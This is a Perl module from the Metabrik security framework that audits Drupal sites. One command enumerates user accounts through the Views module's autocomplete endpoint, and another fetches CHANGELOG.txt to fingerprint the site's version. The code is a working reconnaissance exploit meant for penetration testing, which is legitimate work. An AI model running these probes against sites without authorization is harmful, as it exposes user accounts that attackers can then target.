#
# $Id$
#
# audit::drupal Brik
#
package Metabrik::Audit::Drupal;
use strict;
use warnings;

use base qw(Metabrik);

sub brik_properties {
   return {
      revision => '$Revision$',
      tags => [ qw(unstable audit drupal) ],
      attributes => {
         url_path => [ qw(url_path) ],
         target => [ qw(uri) ],
         views_module_chars => [ qw($character_list) ],
      },
      attributes_default => {
         url_path => '/',
         target => 'http://localhost/',
         views_module_chars => [ 'a'..'z' ],
      },
      commands => {
         views_module_info_disclosure => [ ],
         core_changelog_txt => [ ],
      },
      require_modules => {
         'WWW::Mechanize' => [ ],
      },
   };
}

# http://www.rapid7.com/db/modules/auxiliary/scanner/http/drupal_views_user_enum
# http://www.madirish.net/node/465
sub views_module_info_disclosure {
   my $self = shift;

   my $target = $self->target;
   my $url_path = $self->url_path;
   my $chars = $self->views_module_chars;
   my $exploit = '?q=admin/views/ajax/autocomplete/user/';

   if (ref($chars) ne 'ARRAY') {
      return $self->log->error("views_module_info_disclosure: ".
         "views_module_chars Attribute must be an ARRAYREF. ".
         "Example: my \$list = [ '0'..'9' ]"
      );
   }

   $target =~ s/\/*$//;
   $url_path =~ s/^\/*//;

   my @users = ();
   my $mech = WWW::Mechanize->new;

   for (@$chars) {
      my $url = $target.'/'.$url_path.$exploit.$_;

      $self->log->info("url[$url]");

      $mech->get($url);
      if ($mech->status == 200) {
         my $decoded = $mech->response->decoded_content;
         push @users, $decoded;
         $self->log->verbose($decoded);
      }
   }

   return \@users;
}

# Gather default information disclosure file
sub core_changelog_txt {
   my $self = shift;

   my $target = $self->target;
   my $url_path = $self->url_path;
   my $exploit = 'CHANGELOG.txt';

   $target =~ s/\/*$//;
   $url_path =~ s/^\/*//;

   my $mech = WWW::Mechanize->new;

   my $url = $target.'/'.$url_path.$exploit;

   $self->log->verbose("url[$url]");

   my $result = '';

   $mech->get($url);
   if ($mech->status == 200) {
      $result = $mech->response->decoded_content;
   }

   return $result;
}

1;

__END__

=head1 NAME

Metabrik::Audit::Drupal - audit::drupal Brik

=head1 COPYRIGHT AND LICENSE

Copyright (c) 2014-2015, Patrice E<lt>GomoRE<gt> Auffret

You may distribute this module under the terms of The BSD 3-Clause License.
See LICENSE file in the source distribution archive.

=head1 AUTHOR

Patrice E<lt>GomoRE<gt> Auffret

=cut
